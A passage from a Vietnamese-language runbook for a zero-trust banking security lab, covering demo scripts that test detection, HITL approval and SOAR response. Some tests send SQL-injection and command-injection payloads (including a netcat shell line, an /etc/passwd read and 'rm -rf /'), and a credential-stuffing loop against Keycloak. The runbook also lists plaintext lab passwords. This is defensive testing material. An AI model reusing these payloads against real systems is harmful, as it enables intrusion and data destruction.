curl -s -X POST http://localhost:18082/analyze \
  -H "Content-Type: application/json" \
  -d "{
    \"source\": \"demo7-exfil\",
    \"logs\": [{
      \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
      \"message\": \"bytes_sent=8388608 path=/accounts/ACC-1001/history method=GET source_ip=10.9.8.77 suspicious_large_response\",
      \"labels\": {\"namespace\": \"financial\", \"app\": \"account-service\", \"job\": \"envoy-access\"}
    }]
  }" | python3 -c "import json,sys; d=json.load(sys.stdin); print('verdict:', d['verdict'], '| playbook:', d.get('recommended_playbook'))"
# → verdict: malicious | playbook: restrict_egress
```

---

### Demo 8 — Port Scan (T1046)

```bash
curl -s -X POST http://localhost:18082/analyze \
  -H "Content-Type: application/json" \
  -d "{
    \"source\": \"demo8-portscan\",
    \"logs\": [{
      \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
      \"message\": \"port scan nmap detected syn scan source_ip=10.9.8.99 ports_tried=1024 ztlab_target=api-gateway\",
      \"labels\": {\"namespace\": \"financial\", \"app\": \"api-gateway\", \"job\": \"kubernetes-pods\"}
    }]
  }" | python3 -c "import json,sys; d=json.load(sys.stdin); print('verdict:', d['verdict'], '| severity:', d['severity'])"
```

Live scan (không phá hỏng):
```bash
for port in 18080 18443 8080 3000 18082; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 http://localhost:$port/ 2>/dev/null || echo "timeout")
  printf "port %-5s → %s\n" $port $code
done
```

---

### Demo 9 — Cryptomining (T1496)

```bash
curl -s -X POST http://localhost:18082/analyze \
  -H "Content-Type: application/json" \
  -d "{
    \"source\": \"demo9-cryptomining\",
    \"logs\": [
      {\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
       \"message\": \"xmrig process detected cpu_usage=98% stratum+tcp://pool.example.com:3333 wallet=42... container=payment-service\",
       \"labels\": {\"namespace\": \"financial\", \"app\": \"payment-service\", \"job\": \"kubernetes-pods\"}},
      {\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
       \"message\": \"suspicious_process cryptomining detected pid=1337 binary=/tmp/xmrig\",
       \"labels\": {\"namespace\": \"financial\", \"app\": \"payment-service\", \"job\": \"kubernetes-pods\"}}
    ]
  }" | python3 -c "import json,sys; d=json.load(sys.stdin); print('verdict:', d['verdict'], '| playbook:', d.get('recommended_playbook'))"
```

---

### Demo 10 — AI/SOAR/TheHive HITL pipeline (core demo)

**Mục tiêu:** chứng minh full flow AI → pending → admin approve → SOAR thực thi.

#### Bước 1: Inject tấn công critical
```bash
curl -s -X POST http://localhost:18082/analyze \
  -H "Content-Type: application/json" \
  -d "{
    \"source\": \"demo10-hitl\",
    \"logs\": [{
      \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
      \"message\": \"fraud_gate_bypass detected service=payment-service source_ip=10.9.8.9 unauthorized high-risk transfer amount=999000000 critical\",
      \"labels\": {\"namespace\": \"financial\", \"app\": \"payment-service\", \"job\": \"envoy-access\"}
    }]
  }" | python3 -m json.tool
# → verdict: malicious, severity: critical, recommended_playbook: isolate_workload
```

#### Bước 2: Xem pending alert
```bash
curl -s 'http://localhost:18082/pending?status=pending' | python3 -m json.tool
# Có alert_id và thehive_alert_id
```

Kiểm tra TheHive: `http://localhost:19000/index.html` → org `ztlab` → **Alerts** tab.

#### Bước 3: Xem evidence (endpoint mới)
```bash
ALERT_ID=$(curl -s 'http://localhost:18082/pending?status=pending' \
  | python3 -c "import json,sys; a=json.load(sys.stdin); print(a[0]['alert_id'] if a else '')")

curl -s -X POST "http://localhost:18082/pending/${ALERT_ID}/investigate" \
  | python3 -m json.tool
# → loki_evidence, opa_denials, summary
```

#### Bước 4a: Dismiss (safe demo)
```bash
curl -s -X POST "http://localhost:18082/pending/${ALERT_ID}/dismiss" \
  -H "Content-Type: application/json" \
  -d '{"note":"manual test demo — not a real incident"}' \
  | python3 -c "import json,sys; print('status:', json.load(sys.stdin)['status'])"
```

#### Bước 4b: Approve (cẩn thận — SOAR tác động K8s thật)
```bash
curl -s -X POST "http://localhost:18082/pending/${ALERT_ID}/approve" \
  -H "Content-Type: application/json" \
  -d '{"note":"confirmed attack; execute SOAR playbook"}' \
  | python3 -m json.tool

# Xem SOAR case
curl -s http://localhost:18091/cases | python3 -c "
import json, sys
cases = json.load(sys.stdin)
print(f'Total: {len(cases)} cases')
for c in cases[-3:]:
    print(f'{c[\"case_id\"]} | {c[\"status\"]} | {c[\"attack_type\"]} → {c[\"playbook\"]} | dry_run={c[\"dry_run\"]}')
"

# Rollback nếu cần
CASE_ID=<case_id>
curl -s -X POST "http://localhost:18091/cases/${CASE_ID}/rollback" | python3 -m json.tool
```

---

### Demo 11 — High Velocity / Rate Limit (T1499)

40 request nhanh từ cùng tài khoản:
```bash
blocked=0
for i in $(seq 1 40); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:18080/payments \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"from_account\":\"ACC-1001\",\"to_account\":\"ACC-2001\",\"amount\":150000000,\"currency\":\"VND\"}")
  [[ "$code" == "403" ]] && blocked=$((blocked+1))
done
echo "blocked: $blocked/40 (velocity limit > 10 txn/60s)"
```

---

### Demo 12 — SQL Injection (T1190)

```bash
for payload in "1' OR '1'='1" "'; DROP TABLE accounts;--" "1 UNION SELECT * FROM accounts--" "admin'--"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:18080/payments \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"from_account\":\"${payload}\",\"to_account\":\"ACC-2001\",\"amount\":1000}")
  printf "payload %-40s → %s\n" "${payload:0:40}" "$code"
done
# → 400/422 (input validation)
```

---

### Demo 13 — Command Injection (T1059)

```bash
for payload in '$(cat /etc/passwd)' '| nc 10.9.8.1 4444' '; rm -rf /' '`id`'; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:18080/payments \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"from_account\":\"ACC-1001\",\"to_account\":\"${payload}\",\"amount\":1000}")
  printf "payload %-30s → %s\n" "${payload:0:30}" "$code"
done
# → 400/422 hoặc 403
```

---

### Demo 14 — Account Manipulation (T1098 — leo thang role)

Dùng testuser01 (không có quyền admin) thử truy cập endpoint admin:
```bash
for path in /admin/accounts /admin/config /internal/accounts/bulk /admin/users /admin/policies; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    http://localhost:18080$path \
    -H "Authorization: Bearer $TOKEN")
  printf "%-35s → %s\n" $path "$code"
done
# → 401/403/404
```

---

### Demo 15 — Credential Stuffing (T1078.001)

25 username × common passwords chống Keycloak:
```bash
blocked=0
for user in admin operator superuser root banking_admin test; do
  for pass in "Password123" "Admin@2024" "P@ssw0rd"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST http://localhost:18443/realms/ztlab/protocol/openid-connect/token \
      -d "grant_type=password&client_id=web-portal&username=$user&password=$pass")
    [[ "$code" =~ ^(400|401)$ ]] && blocked=$((blocked+1))
  done
done
echo "Credential stuffing: $blocked requests blocked"
```

---

### Demo 16 — Impair Defenses (T1562 — probe security infra)

```bash
for ep in "http://localhost:18080/opa/v1/policies" \
          "http://localhost:18080/metrics" \
          "http://localhost:3000/api/admin/settings"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$ep")
  printf "%-50s → %s\n" "$ep" "$code"
done
# Tất cả phải là 401/403/404 — không expose
```

---

### Demo 17 — Container Escape (T1611)

Kiểm tra container không có host mounts và không reach được metadata service:
```bash
pod=$(kubectl --context ctx-aws get pod -n financial -l app=api-gateway \
  -o jsonpath='{.items[0].metadata.name}')

# Kiểm tra privileged flags
kubectl --context ctx-aws get pod $pod -n financial \
  -o jsonpath='hostNetwork={.spec.hostNetwork} hostPID={.spec.hostPID} hostIPC={.spec.hostIPC}'
echo ""

# Thử reach EC2 metadata từ container (phải bị block bởi NetworkPolicy)
kubectl --context ctx-aws exec -n financial $pod -c api-gateway -- \
  sh -c 'timeout 3 wget -q -O- http://169.254.169.254/latest/meta-data/ 2>&1 || echo "BLOCKED"'
```

---

### Demo 18 — Data Staging (T1074 / T1020)

20 request nhanh để download history ACC-1001:
```bash
blocked=0
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://localhost:18080/accounts/ACC-1001/history?limit=1000&page=$i" \
    -H "Authorization: Bearer $TOKEN")
  [[ "$code" =~ ^(429|403)$ ]] && blocked=$((blocked+1))
done
echo "Bulk data requests blocked: $blocked/20 (rate limit)"
```

---

### Demo 19 — JWT Replay Attack (T1539)

JWT hết hạn bị từ chối:
```bash
EXPIRED="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxfQ.INVALIDSIG"

code=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST http://localhost:18080/payments \
  -H "Authorization: Bearer $EXPIRED" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":1000}')
echo "Expired JWT → HTTP $code"
# → 401
```

AI phát hiện pattern replay:
```bash
curl -s -X POST http://localhost:18082/analyze \
  -H "Content-Type: application/json" \
  -d "{
    \"source\": \"demo19-replay\",
    \"logs\": [{
      \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
      \"message\": \"jwt_replay_detected token_jti=abc123 same_token_used=47_times source_ips=[10.9.8.1,10.9.8.2] stolen_token_suspected\",
      \"labels\": {\"namespace\": \"financial\", \"app\": \"api-gateway\", \"job\": \"envoy-access\"}
    }]
  }" | python3 -c "import json,sys; d=json.load(sys.stdin); print('verdict:', d['verdict'])"
```

---

### Demo 20 — Chạy tự động toàn bộ 20 kịch bản

```bash
cd /home/deployer/Zero-Trust-based-Security-Detection-and-Response-for-Microservice-in-Multi-Cloud

# Từng kịch bản riêng lẻ
bash tests/scenario_01_brute_force.sh
bash tests/scenario_06_exfiltration.sh
bash tests/scenario_13_sql_injection.sh
bash tests/scenario_20_replay_attack.sh

# Hoặc toàn bộ suite
GW_URL=http://localhost:18080 \
KC_URL=http://localhost:18443 \
AI_URL=http://localhost:18082 \
python3 tests/scenario_00_full_suite.py

# Đo metrics MTTD/MTTR/FPR/FNR
python3 tests/collect_metrics.py

# Benchmark latency overhead
python3 tests/perf_overhead.py --n 50
```

---

### Demo 21 — Cấu hình Grafana Contact Points (HITL notification)

Khi AI tạo pending alert `high/critical`, Grafana rule `ai-pending-approval-alert` fire và gửi qua Contact Point `ztlab-security-admin`.

**Cấu hình kênh nhận:**

1. Mở `http://localhost:3000` → **admin / ZTALab2026!**
2. Sidebar → **Alerting → Contact points**
3. Tìm `ztlab-security-admin` → **Edit**
4. Chọn integration:

| Kênh | Loại | Điền vào |
|------|------|----------|
| Email | Email | SMTP server + địa chỉ nhận |
| Slack | Slack | Incoming Webhook URL |
| Telegram | Telegram | Bot Token + Chat ID |
| Webhook | Webhook | URL nhận POST JSON |

5. **Save** → **Test** để xác nhận
6. **Alerting → Notification policies** → xác nhận route `category=security` trỏ `ztlab-security-admin`

**Kiểm tra alert rule:**
```bash
curl -s http://localhost:3000/api/alertmanager/grafana/api/v2/alerts \
  -u admin:ZTALab2026! \
  | python3 -c "
import json, sys
alerts = json.load(sys.stdin)
for a in alerts:
    labels = a.get('labels', {})
    print(labels.get('alertname','?'), '-', a.get('status',{}).get('state','?'))
"
```

---

## Phần 5 — Sử dụng Web Portal UI

> **Truy cập:** `http://localhost:8080` — đăng nhập `testuser01 / Test1234!`  
> Yêu cầu: đã mở port-forward `svc/web-portal 8080:8080` (Bước 3 Phần 1).

---

### 5.1 — Dashboard

Trang đầu tiên sau khi đăng nhập. Hiển thị:
- Số dư tài khoản `ACC-1001` (real-time từ PostgreSQL qua account-service)
- 10 giao dịch gần nhất
- Trạng thái AI Analyzer (pending alerts count)

---

### 5.2 — Chuyển tiền (`/transfer`)

Thực hiện giao dịch để quan sát toàn bộ Zero Trust flow:

1. Điền số tiền vào form (hoặc dùng Quick Fill: 100K / 1M / 10M / MAX)
2. Nhấn **Chuyển tiền** — animation hiện từng bước:
   - ⬜ JWT Auth → ✅ khi Gateway xác thực
   - ⬜ OPA Policy → ✅ khi Envoy ext_authz pass
   - ⬜ Fraud Score → ✅/❌ kèm score hiển thị
   - ⬜ Core Banking → ✅ khi transaction_id trả về

**Các trường hợp để test:**
| Số tiền | Kết quả mong đợi |
|---------|-----------------|
| 100,000 | ✅ Completed, fraud score ~5 |
| 50,000,000 | ✅ Completed, fraud score ~30 (velocity) |
| 600,000,000 | ❌ HTTP 400 — vượt MAX_SINGLE_TXN (500M VND) |
| Chuyển ACC-1001 → ACC-1001 | ❌ HTTP 409 — source = target |

---

### 5.3 — Security Logs (`/logs`)

Hiển thị security log từ Loki (1 giờ gần nhất):
- Logs từ: `ai-analyzer`, `soar-engine`, `envoy-access`, `opa-decisions`, `kubernetes-pods`
- Click **Refresh** để lấy logs mới nhất
- Tìm trace cụ thể: copy `trace_id` từ kết quả transfer, Ctrl+F trong trang

---

### 5.4 — AI Alerts / HITL (`/alerts`)

Danh sách pending alerts chờ admin phê duyệt:
- Xem severity, attack_type, evidence, MITRE technique
- **Approve** → AI tạo TheHive case → gọi SOAR thực thi playbook
- **Dismiss** → ghi lý do, không tác động

Để có alert để test: chạy một scenario từ tab **⚔️ Kịch bản** với attack_type có severity `high`/`critical`.

---

### 5.5 — Kịch bản tấn công (`/scenarios`)

Trang chính để demo và test. 12 kịch bản chia 3 nhóm:

#### Nhóm 1 — Zero Trust Enforcement (gọi thật đến API Gateway)

| Kịch bản | Mô tả | Kết quả mong đợi |
|----------|-------|-----------------|
| `no_jwt` | Request không có Authorization header | HTTP 401 |
| `jwt_forgery` | JWT giả với chữ ký sai | HTTP 401 |
| `lateral_movement` | Gọi endpoint nội bộ qua gateway | HTTP 403 (OPA deny) |
| `fraud_gate` | Chuyển 600M VND — vượt ngưỡng | HTTP 400 hoặc 403 |

#### Nhóm 2 — Velocity / Rate Limit

| Kịch bản | Mô tả | Kết quả mong đợi |
|----------|-------|-----------------|
| `high_velocity` | 10 lần chuyển tiền liên tiếp | Score tăng, cuối có thể 403 |
| `rate_limit` | 65 GET /health trong 1 phút | Một số HTTP 429 |

#### Nhóm 3 — AI Detection (inject log vào AI Analyzer)

| Kịch bản | Attack type | Playbook kỳ vọng |
|----------|-------------|-----------------|
| `inject_brute_force` | brute_force | revoke_user_sessions |
| `inject_port_scan` | port_scan | block_source_ip |
| `inject_exfiltration` | large_response | restrict_egress |
| `inject_cryptomining` | cryptomining | quarantine_workload |
| `sqli_probe` | exploit_probe | block_source_ip |
| `inject_cred_stuffing` | credential_stuffing | revoke_user_sessions |

**Cách đọc kết quả:**
- 🟥 JSON đỏ: `verdict=malicious` — hệ thống phát hiện
- 🟩 JSON xanh: `completed` — giao dịch thành công
- Velocity chips: `allow` (xanh) / `block` (đỏ)

**Workflow demo đầy đủ:**
```
1. Chạy "inject_port_scan" → verdict=malicious → SOAR tạo case
2. Nếu severity=high → hiện alert trong /alerts
3. Vào /alerts → Approve
4. SOAR thực thi block_source_ip → NetworkPolicy tạo ra
5. Xem kết quả trong Grafana: {job="soar-engine"} |= "soar_action"
```

---

### 5.6 — Quick links trên Scenarios page

| Link | URL | Credentials |
|------|-----|-------------|
| AI Alerts (HITL) | http://localhost:8080/alerts | session hiện tại |
| Grafana | http://localhost:3000 | admin / ZTALab2026! |
| TheHive | http://localhost:9000 | admin@thehive.local / secret |

---

## Phần 6 — Khởi động nhanh (script tự động)

Script sau mở tunnel + tất cả port-forward + health check trong một lần chạy:

```bash
#!/usr/bin/env bash
# Quick start: tunnel + port-forward + health check
set -euo pipefail
cd "$(dirname "$0")/.."

KEY=~/.ssh/zta-siem-soar-key
BASTION=$(aws ec2 describe-instances --region ap-southeast-1 \
  --instance-ids i-06d2382ad780bda8c \
  --query 'Reservations[0].Instances[0].PublicIpAddress' --output text)

echo "[1/3] Bastion: $BASTION"

# Tunnel kubectl
pkill -f "ssh.*6444" 2>/dev/null || true; sleep 1
ssh -fN -i $KEY -o StrictHostKeyChecking=no -o ServerAliveInterval=30 \
  -L 6444:10.10.1.10:6443 -J ubuntu@${BASTION} ubuntu@10.10.1.10
sleep 2
bash scripts/k8s-tunnel.sh sync aws

echo "[2/3] Port-forwards"
pkill -f "kubectl.*port-forward" 2>/dev/null || true; sleep 1

for spec in \
  "ctx-aws financial keycloak 8180:8080" \
  "ctx-aws financial api-gateway 18080:8080" \
  "ctx-aws financial web-portal 8080:8080" \
  "ctx-aws plg-stack grafana 3000:3000" \
  "ctx-aws plg-stack ai-analyzer 8090:8080" \
  "ctx-aws plg-stack soar-engine 8091:8080" \
  "ctx-aws plg-stack loki 3100:3100" \
  "ctx-aws plg-stack thehive 9000:9000"
do
  read ctx ns svc ports <<< "$spec"
  nohup kubectl --context $ctx port-forward svc/$svc $ports -n $ns \
    > /tmp/pf-${svc}.log 2>&1 &
done
sleep 4

echo "[3/3] Health check"
curl -sf http://localhost:8080/health | python3 -c "import json,sys; d=json.load(sys.stdin); print('Web Portal:', d['status'])"
curl -sf http://localhost:18080/health | python3 -c "import json,sys; d=json.load(sys.stdin); print('API Gateway:', d['status'])"
curl -sf http://localhost:8090/health | python3 -c "import json,sys; d=json.load(sys.stdin); print('AI Analyzer:', d['status'], '| pending:', d.get('pending_alerts_count',0))"
curl -sf http://localhost:8091/health | python3 -c "import json,sys; d=json.load(sys.stdin); print('SOAR Engine:', d['status'], '| dry_run:', d.get('dry_run'))"
curl -sf http://localhost:3000/api/health | python3 -c "import json,sys; print('Grafana:', json.load(sys.stdin).get('database','?'))"

echo ""
echo "=== Truy cập Web Portal: http://localhost:8080 ==="
echo "=== Login: testuser01 / Test1234! ==="
```

Lưu thành `scripts/quickstart.sh`, chạy: `bash scripts/quickstart.sh`

---

## Phần 7 — Tắt/bật tiết kiệm chi phí

### Tắt (stop, giữ data)
```bash
# Đóng port-forward trước
pkill -f "kubectl.*port-forward" 2>/dev/null

aws ec2 stop-instances --region ap-southeast-1 \
  --instance-ids \
    i-06d2382ad780bda8c \
    i-0293f9568b3c0762b \
    i-00001195627942100 \
    i-08f1cf418461cca62
```

### Bật lại → làm theo Phần 1

> Data trong PostgreSQL, Keycloak, Redis, Cassandra (TheHive) được giữ nguyên vì dùng PersistentVolume.

---

## Phần 8 — SOAR live mode

```bash
# Kiểm tra trạng thái
curl -s http://localhost:18091/health \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print('dry_run:', d.get('dry_run'), '| auto_execute:', d.get('auto_execute'))"

# Bật live mode (K8s actions thật)
kubectl --context ctx-aws set env deployment/soar-engine SOAR_DRY_RUN=false -n plg-stack

# Tắt về dry-run (chỉ tạo case, không tác động K8s)
kubectl --context ctx-aws set env deployment/soar-engine SOAR_DRY_RUN=true -n plg-stack

kubectl --context ctx-aws rollout status deployment/soar-engine -n plg-stack --timeout=30s
```

> Khi live mode: **không approve alert test** nếu chưa sẵn sàng rollback. Rollback qua `POST /cases/{id}/rollback`.

---

## Phần 9 — Lệnh tra cứu nhanh

### Kiểm tra tổng quan
```bash
# Nodes
kubectl --context ctx-aws get nodes && kubectl --context ctx-openstack get nodes

# Pods không Running
kubectl --context ctx-aws get pods -A --no-headers | grep -v "Running\|Completed"
kubectl --context ctx-openstack get pods -A --no-headers | grep -v "Running\|Completed"

# SPIRE entries
kubectl --context ctx-aws exec -n spire \
  $(kubectl --context ctx-aws get pod -n spire -l app=spire-server -o jsonpath='{.items[0].metadata.name}') \
  -- /opt/spire/bin/spire-server entry show | grep "SPIFFE ID"

# Pending alerts
curl -s 'http://localhost:18082/pending?status=pending' | python3 -m json.tool

# SOAR cases gần đây
curl -s http://localhost:18091/cases | python3 -c "
import json,sys
cases=json.load(sys.stdin); print(f'Total: {len(cases)}')
for c in cases[-5:]: print(c['case_id'][:16], c['status'], c.get('playbook'))
"
```

### LogQL trong Grafana Explore

```logql
# Tất cả financial logs
{job="kubernetes-pods", namespace="financial"} | json

# Chỉ OpenStack
{job="kubernetes-pods", namespace="financial", cloud="openstack"}

# OPA deny
{job="opa-decisions"} | json | opa_result="false"

# AI alerts
{job="ai-analyzer"} |= "ai_security_alert"

# Pending approvals
{job="ai-analyzer"} |= "pending_approval=\"true\""

# SOAR actions
{job="soar-engine"} |= "soar_action"

# Fraud blocks
{job="kubernetes-pods"} |= "payment_blocked_fraud"

# Cross-cloud trace (thay <id> bằng trace_id thực)
{job="kubernetes-pods", namespace="financial"} |= "<trace_id>"

# MITRE T1110 brute force
{job=~"kubernetes-pods|envoy-access"} |~ "brute_force|login_failed.*attempt"
```

### NodePorts OpenStack (10.10.1.12)

| Port | Mục đích |
|------|---------|
| 30081 | core-banking Envoy inbound mTLS (cross-cloud payment) |
| 30082 | account-service |
| 30083 | transaction-service |
| 30084 | core-banking health (HTTP plain) |

---

*Báo cáo chi tiết: [BAOCAO.md](BAOCAO.md)*

---

## Phần 10 — Chạy hệ thống theo flow đầy đủ (CLI)

> **Mục đích:** Hướng dẫn chạy từng flow theo đúng thứ tự qua CLI — từ đăng nhập, giao dịch bình thường, tấn công, AI phát hiện, HITL approval, đến SOAR thực thi và rollback. Mỗi flow độc lập, copy-paste được.  
> Nếu muốn dùng UI thay vì CLI → xem [Phần 5](#phần-5--sử-dụng-web-portal-ui).
>
> **Yêu cầu:** Hoàn tất Phần 1 (Bước 1–5). Tất cả pods đang Running.

---

### 7.0 — Chuẩn bị chung (chạy một lần trước tất cả flows)

```bash
# Lấy token testuser01 — dùng cho tất cả flows bên dưới
TOKEN=$(curl -s -X POST \
  http://localhost:18443/realms/ztlab/protocol/openid-connect/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=web-portal&username=testuser01&password=Test1234!" \
  | python3 -c "import sys,json; t=json.load(sys.stdin); print(t.get('access_token','ERROR'))")

# Kiểm tra token hợp lệ
echo "${TOKEN:0:40}..."
[ "$TOKEN" = "ERROR" ] && echo "LỖI: lấy token thất bại — kiểm tra Keycloak" && exit 1

# Kiểm tra tất cả services đang chạy
for svc in "18080:/health" "18082:/health" "18091:/health" "3000:/api/health"; do
  port="${svc%%:*}"; path="${svc##*:}"
  code=$(curl -so /dev/null -w "%{http_code}" "http://localhost:$port$path")
  echo ":$port → HTTP $code"
done
# Mong đợi: 4x 200
```

---

### Flow 1 — Giao dịch bình thường → xác minh cross-cloud trace

**Mục tiêu chứng minh:** JWT verify → Envoy ext_authz → OPA allow → fraud gate pass → cross-cloud mTLS → core-banking commit → trace xuyên hai cloud.

```bash
echo "=== BƯỚC 1: Gửi giao dịch ==="
RESULT=$(curl -s -X POST http://localhost:18080/payments \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":100000,"currency":"VND"}')

echo "$RESULT" | python3 -m json.tool

# Lấy trace_id
TRACE_ID=$(echo "$RESULT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('trace_id',''))")
echo "trace_id: $TRACE_ID"
```

Kết quả mong đợi:
```json
{
  "status": "completed",
  "trace_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "fraud": {"score": 5, "verdict": "allow", "gate": "passed"},
  "core_banking": {"transaction_id": "...", "status": "completed"}
}
```

```bash
echo "=== BƯỚC 2: Xác minh fraud score ==="
echo "$RESULT" | python3 -c "
import json,sys
d = json.load(sys.stdin)
fraud = d.get('fraud',{})
print(f'  score    : {fraud.get(\"score\")}  (phải < 75)')
print(f'  verdict  : {fraud.get(\"verdict\")}  (phải = allow)')
print(f'  gate     : {fraud.get(\"gate\")}  (phải = passed)')
cb = d.get('core_banking',{})
print(f'  txn_id   : {cb.get(\"transaction_id\",\"\")[:8]}...')
print(f'  cb_status: {cb.get(\"status\")}  (phải = completed)')
"

echo ""
echo "=== BƯỚC 3: Tìm trace trong log AWS (payment-service) ==="
kubectl --context ctx-aws logs -n financial -l app=payment-service \
  -c payment-service --since=2m \
  | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if '$TRACE_ID' in json.dumps(d):
            print('[AWS]', d.get('event','?'), '|', d.get('cloud','?'))
    except: pass
" | head -5

echo ""
echo "=== BƯỚC 4: Tìm trace trong log OpenStack (core-banking) ==="
kubectl --context ctx-openstack logs -n financial -l app=core-banking \
  -c core-banking --since=2m \
  | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if '$TRACE_ID' in json.dumps(d):
            print('[OS]', d.get('event','?'), '|', d.get('cloud','?'))
    except: pass
" | head -5
```

```bash
echo ""
echo "=== BƯỚC 5: Xem Envoy access log — SVID mTLS ==="
kubectl --context ctx-openstack logs -n financial -l app=core-banking \
  -c envoy --since=2m \
  | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if d.get('response_code') == 200:
            print('SVID:', d.get('svid','?'))
            print('path:', d.get('path','?'), '| code:', d.get('response_code'))
            break
    except: pass
"
# Mong đợi: SVID: spiffe://ztlab.local/aws/payment-service
```

```bash
echo ""
echo "=== BƯỚC 6: Xem trace xuyên cloud trong Grafana ==="
echo "Mở: http://localhost:3000/explore"
echo "LogQL: {job=\"kubernetes-pods\", namespace=\"financial\"} |= \"$TRACE_ID\""
echo ""
echo "Flow 1 hoàn tất ✓"
```

---

### Flow 2 — AI phát hiện tấn công (SIEM pipeline)

**Mục tiêu chứng minh:** Log bất thường → Promtail → Loki → AI Analyzer poll → verdict malicious → pending alert.

```bash
echo "=== BƯỚC 1: Inject log tấn công vào AI Analyzer ==="
AI_RESP=$(curl -s -X POST http://localhost:18082/analyze \
  -H "Content-Type: application/json" \
  -d "{
    \"source\": \"flow2_demo\",
    \"logs\": [
      {
        \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
        \"message\": \"login_failed invalid_credentials attempt=20 username=admin source_ip=10.9.8.55 brute_force_detected within_30s\",
        \"labels\": {
          \"namespace\": \"identity\",
          \"app\": \"keycloak\",
          \"job\": \"kubernetes-pods\",
          \"cloud\": \"aws\"
        }
      }
    ]
  }")

echo "$AI_RESP" | python3 -m json.tool
```

```bash
echo ""
echo "=== BƯỚC 2: Xem kết quả phân tích ==="
echo "$AI_RESP" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print(f'verdict   : {d.get(\"verdict\")}')
print(f'severity  : {d.get(\"severity\")}')
print(f'confidence: {d.get(\"confidence\")}')
print(f'attack    : {d.get(\"attack_type\")}')
print(f'techniques: {d.get(\"attack_techniques\",[])}')
print(f'playbook  : {d.get(\"recommended_playbook\")}')
print(f'reasoning : {d.get(\"reasoning\",\"\")[:100]}...')
"
# Mong đợi: verdict=malicious, severity=high, attack_type=brute_force
```

```bash
echo ""
echo "=== BƯỚC 3: Kiểm tra pending alerts ==="
PENDING=$(curl -s "http://localhost:18082/pending?status=pending")
echo "$PENDING" | python3 -c "
import json,sys
alerts = json.load(sys.stdin)
print(f'Pending alerts: {len(alerts)}')
for a in alerts:
    print(f'  [{a[\"alert_id\"][:8]}] {a.get(\"attack_type\")} | {a.get(\"severity\")} | status={a.get(\"status\")}')
"
```

```bash
echo ""
echo "=== BƯỚC 4: Kiểm tra Grafana alert rule ==="
echo "Mở: http://localhost:3000/alerting/list"
echo "Rule 'ai-pending-approval-alert' phải FIRING nếu có pending alert"
echo ""
echo "=== BƯỚC 5: Xem log AI trong Loki ==="
echo "Grafana Explore > LogQL:"
echo '  {job="ai-analyzer"} |= "ai_security_alert" | json'
echo ""
echo "Flow 2 hoàn tất ✓"
```

---

### Flow 3 — HITL approval → SOAR isolate_workload → Rollback

**Mục tiêu chứng minh:** Admin nhận thông báo → xem investigate evidence → approve → SOAR thực thi 4 bước → rollback khôi phục service.

```bash
echo "=== BƯỚC 1: Tạo high-severity alert (fraud_gate_bypass) ==="
AI_RESP=$(curl -s -X POST http://localhost:18082/analyze \
  -H "Content-Type: application/json" \
  -d "{
    \"source\": \"flow3_demo\",
    \"logs\": [
      {
        \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
        \"message\": \"fraud_gate_bypass attempted source_ip=10.9.8.77 service=payment-service path=/transactions/execute score=0 gate=missing\",
        \"labels\": {\"namespace\": \"financial\", \"app\": \"core-banking\", \"job\": \"kubernetes-pods\", \"cloud\": \"openstack\"}
      }
    ]
  }")

echo "$AI_RESP" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print('verdict:', d.get('verdict'), '| severity:', d.get('severity'))
print('playbook:', d.get('recommended_playbook'))
"
```

```bash
echo ""
echo "=== BƯỚC 2: Lấy alert_id từ pending queue ==="
PENDING=$(curl -s "http://localhost:18082/pending?status=pending")
ALERT_ID=$(echo "$PENDING" | python3 -c "
import json,sys
alerts = json.load(sys.stdin)
fraud = [a for a in alerts if 'fraud' in a.get('attack_type','').lower() or 'fraud' in a.get('summary','').lower()]
target = fraud[-1] if fraud else (alerts[-1] if alerts else None)
if target:
    print(target['alert_id'])
" 2>/dev/null || echo "")

if [ -z "$ALERT_ID" ]; then
  echo "Không có pending alert — thử lại bước 1 hoặc chờ AI poll (120s)"
else
  echo "alert_id: $ALERT_ID"
fi
```

```bash
echo ""
echo "=== BƯỚC 3: Investigate — xem evidence trước khi approve ==="
if [ -n "$ALERT_ID" ]; then
  EVIDENCE=$(curl -s -X POST "http://localhost:18082/pending/$ALERT_ID/investigate" \
    -H "Content-Type: application/json")
